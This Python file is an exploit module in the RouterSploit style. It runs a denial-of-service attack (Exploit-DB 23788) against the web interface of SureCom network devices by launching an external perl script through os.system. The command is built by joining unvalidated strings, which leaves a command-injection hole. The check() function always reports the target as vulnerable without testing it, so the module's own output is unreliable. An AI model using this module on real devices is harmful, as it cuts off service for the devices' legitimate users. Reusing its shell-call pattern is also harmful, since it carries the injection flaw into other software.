import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "SureCom_EP-9510AX/EP-4504AX_Network_Device-Malformed_Web_Authorisation_Request_Denial_of_Service",

        "description": " An issue in the handling of specific web requests by SureCom network devices has been  "
                       " identified. By placing a malformed request to the web configuration interface,  "
                       " it is possible for an attacker to deny service to legitimate users of a vulnerable device. ",

        "authors": (

            "Vasco Costa",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/23788",

        ),

        "devices": (

            "SureCom, EDB-ID:23788"
        ),
    }

    target = OptIP(""," server ip ")
    port = OptPort("", "Target HTTP port")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "perl exploit-db-23788.pl {} {}".format(self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True